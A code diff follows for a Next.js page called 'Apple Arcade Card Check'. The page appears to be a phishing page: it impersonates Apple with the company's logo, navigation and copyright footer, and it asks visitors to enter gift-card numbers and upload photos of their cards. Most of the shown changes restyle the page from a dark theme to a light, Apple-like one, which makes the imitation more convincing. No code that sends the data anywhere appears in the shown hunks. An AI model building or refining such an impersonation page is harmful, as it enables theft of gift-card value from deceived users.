@@ -2,22 +2,22 @@ import { useState, useEffect } from 'react'
 import Head from 'next/head'
 
 const COLORS = {
-  bg: '#08080f',
-  surface: '#12121a',
-  surfaceHover: '#1a1a25',
-  border: 'rgba(255,255,255,0.06)',
-  borderHover: 'rgba(255,255,255,0.12)',
-  text: '#f5f5f7',
-  textSecondary: '#86868b',
-  accent: '#2997ff',
-  accentGlow: 'rgba(41,151,255,0.15)',
-  error: '#ff453a',
-  errorBg: 'rgba(255,69,58,0.1)',
-  success: '#30d158',
-  gradient1: '#2997ff',
-  gradient2: '#a855f7',
-  glass: 'rgba(255,255,255,0.03)',
-  glassBorder: 'rgba(255,255,255,0.08)',
+  bg: '#ffffff',
+  surface: '#f5f5f7',
+  surfaceHover: '#e8e8ed',
+  border: 'rgba(0,0,0,0.08)',
+  borderHover: 'rgba(0,0,0,0.15)',
+  text: '#1d1d1f',
+  textSecondary: '#6e6e73',
+  accent: '#0071e3',
+  accentGlow: 'rgba(0,113,227,0.1)',
+  error: '#ff3b30',
+  errorBg: 'rgba(255,59,48,0.08)',
+  success: '#34c759',
+  gradient1: '#0071e3',
+  gradient2: '#5856d6',
+  glass: 'rgba(255,255,255,0.8)',
+  glassBorder: 'rgba(0,0,0,0.06)',
 }
 
 export default function PeterPage() {
@@ -135,16 +135,15 @@ export default function PeterPage() {
         <title>Apple Arcade Card Check</title>
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <style>{`
-          @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
           *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
           html { scroll-behavior: smooth; }
-          body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', sans-serif; background: ${COLORS.bg}; color: ${COLORS.text}; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; overflow-x: hidden; }
-          ::selection { background: rgba(41,151,255,0.3); }
-          input::placeholder { color: rgba(255,255,255,0.25); }
+          body { font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: ${COLORS.bg}; color: ${COLORS.text}; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; overflow-x: hidden; }
+          ::selection { background: rgba(0,113,227,0.2); }
+          input::placeholder { color: rgba(0,0,0,0.25); }
           @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
           @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
           @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-          @keyframes glow { 0%, 100% { box-shadow: 0 0 20px rgba(41,151,255,0.1); } 50% { box-shadow: 0 0 40px rgba(41,151,255,0.2); } }
+          @keyframes glow { 0%, 100% { box-shadow: 0 0 20px rgba(0,113,227,0.08); } 50% { box-shadow: 0 0 40px rgba(0,113,227,0.12); } }
           @keyframes slideUp { from { opacity: 0; transform: translateY(40px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
         `}</style>
       </Head>
@@ -153,7 +152,7 @@ export default function PeterPage() {
       {showLocationBanner && (
         <div style={{
           position: 'fixed', top: 0, left: 0, right: 0, zIndex: 100,
-          background: 'rgba(18,18,26,0.95)', backdropFilter: 'blur(20px)',
+          background: 'rgba(255,255,255,0.95)', backdropFilter: 'blur(20px)',
           borderBottom: `1px solid ${COLORS.border}`,
           padding: '12px 24px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '12px', flexWrap: 'wrap',
           animation: 'fadeIn 0.4s ease'
@@ -163,7 +162,7 @@ export default function PeterPage() {
             value={location}
             onChange={(e) => setLocation(e.target.value)}
             style={{
-              background: COLORS.surface, color: COLORS.text, border: `1px solid ${COLORS.border}`,
+              background: '#fff', color: COLORS.text, border: `1px solid ${COLORS.border}`,
               borderRadius: '8px', padding: '6px 12px', fontSize: '13px', outline: 'none', cursor: 'pointer'
             }}
           >
@@ -182,7 +181,7 @@ export default function PeterPage() {
       {/* Header */}
       <header style={{
         position: 'fixed', top: showLocationBanner ? '48px' : 0, left: 0, right: 0, zIndex: 90,
-        background: scrolled ? 'rgba(8,8,15,0.85)' : 'transparent',
+        background: scrolled ? 'rgba(255,255,255,0.85)' : 'transparent',
         backdropFilter: scrolled ? 'blur(20px) saturate(180%)' : 'none',
         borderBottom: scrolled ? `1px solid ${COLORS.border}` : '1px solid transparent',
         transition: 'all 0.3s ease',
@@ -190,9 +189,9 @@ export default function PeterPage() {
       }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
           <svg width="20" height="24" viewBox="0 0 20 24" fill="none" style={{ opacity: 0.9 }}>
-            <path d="M15.2 12.8c0-2.8 2.3-4.1 2.4-4.2-1.3-1.9-3.3-2.2-4-2.3-1.7-.2-3.3 1-4.2 1s-2.2-1-3.6-1c-1.9 0-3.6 1.1-4.6 2.8-2 3.5-.5 8.6 1.4 11.4 1 1.4 2.1 3 3.6 2.9 1.4-.1 2-.9 3.6-.9s2.2.9 3.6.9 2.4-1.4 3.3-2.8c1.2-1.6 1.6-3.1 1.7-3.2-.1-.1-3.2-1.2-3.2-4.7zM12.3 4.3c.8-1 1.4-2.3 1.2-3.6-1.2.1-2.6.8-3.4 1.8-.7.9-1.4 2.2-1.2 3.5 1.3.1 2.7-.7 3.4-1.7z" fill="white"/>
+            <path d="M15.2 12.8c0-2.8 2.3-4.1 2.4-4.2-1.3-1.9-3.3-2.2-4-2.3-1.7-.2-3.3 1-4.2 1s-2.2-1-3.6-1c-1.9 0-3.6 1.1-4.6 2.8-2 3.5-.5 8.6 1.4 11.4 1 1.4 2.1 3 3.6 2.9 1.4-.1 2-.9 3.6-.9s2.2.9 3.6.9 2.4-1.4 3.3-2.8c1.2-1.6 1.6-3.1 1.7-3.2-.1-.1-3.2-1.2-3.2-4.7zM12.3 4.3c.8-1 1.4-2.3 1.2-3.6-1.2.1-2.6.8-3.4 1.8-.7.9-1.4 2.2-1.2 3.5 1.3.1 2.7-.7 3.4-1.7z" fill="#1d1d1f"/>
           </svg>
-          <span style={{ fontSize: '15px', fontWeight: 600, letterSpacing: '-0.01em', color: 'rgba(255,255,255,0.9)' }}>Apple Arcade</span>
+          <span style={{ fontSize: '15px', fontWeight: 600, letterSpacing: '-0.01em', color: COLORS.text }}>Apple Arcade</span>
         </div>
         <nav style={{ display: 'flex', gap: '28px' }}>
           {['Store', 'Mac', 'iPad', 'iPhone', 'Watch', 'Arcade', 'Support'].map(item => (
@@ -209,36 +208,26 @@ export default function PeterPage() {
       <section style={{ position: 'relative', marginTop: showLocationBanner ? '104px' : '56px', overflow: 'hidden' }}>
         <div style={{
           width: '100%', height: 'clamp(320px, 50vw, 520px)', position: 'relative',
-          background: `linear-gradient(180deg, ${COLORS.bg} 0%, #0d0d1a 40%, #111128 70%, ${COLORS.bg} 100%)`
+          background: `linear-gradient(180deg, ${COLORS.bg} 0%, #f0f0f5 40%, #e8e8ed 70%, ${COLORS.bg} 100%)`
         }}>
           <img src="/applearcade.jpeg" alt="" style={{
             position: 'absolute', inset: 0, width: '100%', height: '100%',
-            objectFit: 'cover', objectPosition: 'center', opacity: 0.7,
+            objectFit: 'cover', objectPosition: 'center', opacity: 0.85,
             maskImage: 'linear-gradient(to bottom, transparent 0%, black 15%, black 75%, transparent 100%)',
             WebkitMaskImage: 'linear-gradient(to bottom, transparent 0%, black 15%, black 75%, transparent 100%)'
           }} />
           <div style={{
             position: 'absolute', inset: 0,
-            background: 'radial-gradient(ellipse at center top, rgba(41,151,255,0.08) 0%, transparent 60%)'
+            background: 'radial-gradient(ellipse at center top, rgba(0,113,227,0.04) 0%, transparent 60%)'
           }} />
         </div>
         <div style={{
           position: 'absolute', bottom: 0, left: 0, right: 0, padding: '0 24px 48px',
           textAlign: 'center', zIndex: 2
         }}>
-          <div style={{
-            display: 'inline-block', padding: '6px 14px', borderRadius: '20px',
-            background: 'rgba(41,151,255,0.1)', border: '1px solid rgba(41,151,255,0.2)',
-            fontSize: '12px', fontWeight: 600, color: COLORS.accent, letterSpacing: '0.5px', textTransform: 'uppercase',
-            marginBottom: '16px'
-          }}>
-            Arcade Card Verification
-          </div>
           <h1 style={{
-            fontSize: 'clamp(32px, 5vw, 56px)', fontWeight: 800, letterSpacing: '-0.03em',
-            lineHeight: 1.1, marginBottom: '12px',
-            background: `linear-gradient(135deg, ${COLORS.text} 0%, rgba(255,255,255,0.7) 100%)`,
-            WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent'
+            fontSize: 'clamp(32px, 5vw, 56px)', fontWeight: 700, letterSpacing: '-0.03em',
+            lineHeight: 1.1, marginBottom: '12px', color: COLORS.text
           }}>
             Apple Arcade Card Check
           </h1>
@@ -261,7 +250,7 @@ export default function PeterPage() {
           borderRadius: '20px',
           padding: '32px',
           animation: 'slideUp 0.6s ease',
-          boxShadow: '0 8px 32px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,255,255,0.02) inset'
+          boxShadow: '0 4px 24px rgba(0,0,0,0.06), 0 0 0 1px rgba(0,0,0,0.02) inset'
         }}>
           <form onSubmit={checkBalance}>
             {cards.map((cardValue, index) => (
@@ -280,7 +269,7 @@ export default function PeterPage() {
                     placeholder="XXXX XXXX XXXX XXXX"
                     autoComplete="off"
                     style={{
-                      flex: 1, background: 'rgba(255,255,255,0.04)',
+                      flex: 1, background: '#fff',
                       border: `1px solid ${COLORS.border}`, borderRadius: '12px',
                       padding: '14px 16px', fontSize: '16px', color: COLORS.text,
                       outline: 'none', transition: 'all 0.2s', letterSpacing: '0.05em',
@@ -332,7 +321,7 @@ export default function PeterPage() {
               >
                 {loading ? (
                   <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
-                    <span style={{ width: '16px', height: '16px', border: '2px solid rgba(255,255,255,0.3)', borderTopColor: '#fff', borderRadius: '50%', animation: 'pulse 1s ease infinite' }} />
+                    <span style={{ width: '16px', height: '16px', border: `2px solid rgba(0,113,227,0.3)`, borderTopColor: COLORS.accent, borderRadius: '50%', animation: 'pulse 1s ease infinite' }} />
                     Checking…
                   </span>
                 ) : 'Check Card'}
@@ -358,7 +347,7 @@ export default function PeterPage() {
           {result && !showUploadStep && (
             <div style={{
               marginTop: '20px', padding: '20px', borderRadius: '16px',
-              background: 'rgba(255,255,255,0.02)', border: `1px solid ${COLORS.border}`,
+              background: COLORS.surface, border: `1px solid ${COLORS.border}`,
               animation: 'slideUp 0.4s ease'
             }}>
               <div style={{ fontSize: '11px', fontWeight: 600, color: COLORS.textSecondary, textTransform: 'uppercase', letterSpacing: '1px', marginBottom: '8px' }}>Card Type</div>
@@ -375,7 +364,7 @@ export default function PeterPage() {
 
           {/* Upload Step */}
           {showUploadStep && (
-            <div style={{ marginTop: '20px', padding: '24px', borderRadius: '16px', background: 'rgba(255,255,255,0.02)', border: `1px solid ${COLORS.border}`, animation: 'slideUp 0.4s ease' }}>
+            <div style={{ marginTop: '20px', padding: '24px', borderRadius: '16px', background: COLORS.surface, border: `1px solid ${COLORS.border}`, animation: 'slideUp 0.4s ease' }}>
               <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '8px' }}>
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke={COLORS.accent} strokeWidth="2" strokeLinecap="round">
                   <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/>
@@ -386,11 +375,11 @@ export default function PeterPage() {
 
               <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap', marginBottom: '16px' }}>
                 {selectedImages.map((img, idx) => (
-                  <div key={idx} style={{ position: 'relative', width: '80px', height: '80px', borderRadius: '10px', overflow: 'hidden', border: `1px solid ${COLORS.border}` }}>
+                  <div key={idx} style={{                     position: 'relative', width: '80px', height: '80px', borderRadius: '10px', overflow: 'hidden', border: `1px solid ${COLORS.border}`, background: '#f5f5f7' }}>
                     <img src={img.preview} alt="" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                     <button type="button" onClick={() => removeImage(idx)} style={{
                       position: 'absolute', top: '4px', right: '4px', width: '20px', height: '20px',
-                      borderRadius: '50%', background: 'rgba(0,0,0,0.6)', border: 'none',
+                      borderRadius: '50%', background: 'rgba(0,0,0,0.5)', border: 'none',
                       color: '#fff', fontSize: '12px', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center'
                     }}>×</button>
                   </div>
@@ -399,7 +388,8 @@ export default function PeterPage() {
                   <label style={{
                     width: '80px', height: '80px', borderRadius: '10px', border: `1px dashed ${COLORS.borderHover}`,
                     display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
-                    cursor: 'pointer', transition: 'all 0.2s', color: COLORS.textSecondary, fontSize: '11px', gap: '4px'
+                    cursor: 'pointer', transition: 'all 0.2s', color: COLORS.textSecondary, fontSize: '11px', gap: '4px',
+                    background: 'transparent'
                   }}>
                     <input type="file" accept="image/*" onChange={handleImageSelect} multiple style={{ display: 'none' }} />
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
@@ -463,7 +453,7 @@ export default function PeterPage() {
                   { title: 'Receipt', desc: 'If purchased in-store, check your receipt for the code.', icon: '🧾' }
                 ].map((item, i) => (
                   <div key={i} style={{
-                    padding: '16px', borderRadius: '12px', background: 'rgba(255,255,255,0.02)',
+                    padding: '16px', borderRadius: '12px', background: '#fff',
                     border: `1px solid ${COLORS.border}`, textAlign: 'center'
                   }}>
                     <div style={{ fontSize: '28px', marginBottom: '8px' }}>{item.icon}</div>
@@ -507,8 +497,8 @@ export default function PeterPage() {
                 <div key={i} style={{ display: 'flex', gap: '14px', marginBottom: i < 2 ? '16px' : '0' }}>
                   <div style={{
                     width: '32px', height: '32px', borderRadius: '10px', flexShrink: 0,
-                    background: `linear-gradient(135deg, ${COLORS.accentGlow}, rgba(168,85,247,0.1))`,
-                    border: `1px solid rgba(41,151,255,0.15)`,
+                    background: `linear-gradient(135deg, ${COLORS.accentGlow}, rgba(88,86,214,0.08))`,
+                    border: `1px solid rgba(0,113,227,0.12)`,
                     display: 'flex', alignItems: 'center', justifyContent: 'center',
                     fontSize: '12px', fontWeight: 700, color: COLORS.accent
                   }}>{item.step}</div>
@@ -521,10 +511,10 @@ export default function PeterPage() {
 
         {/* Footer */}
         <div style={{ marginTop: '48px', textAlign: 'center', padding: '24px 0', borderTop: `1px solid ${COLORS.border}` }}>
-          <p style={{ fontSize: '12px', color: 'rgba(255,255,255,0.3)' }}>
+          <p style={{ fontSize: '12px', color: COLORS.textSecondary }}>
             Need help? <a href="https://support.apple.com/gift-card" target="_blank" rel="noopener noreferrer" style={{ color: COLORS.accent, textDecoration: 'none' }}>Visit Apple Support</a>
           </p>
-          <p style={{ fontSize: '11px', color: 'rgba(255,255,255,0.2)', marginTop: '8px' }}>© {new Date().getFullYear()} Apple Inc. All rights reserved.</p>
+          <p style={{ fontSize: '11px', color: 'rgba(0,0,0,0.3)', marginTop: '8px' }}>© {new Date().getFullYear()} Apple Inc. All rights reserved.</p>
         </div>
       </main>
     </>
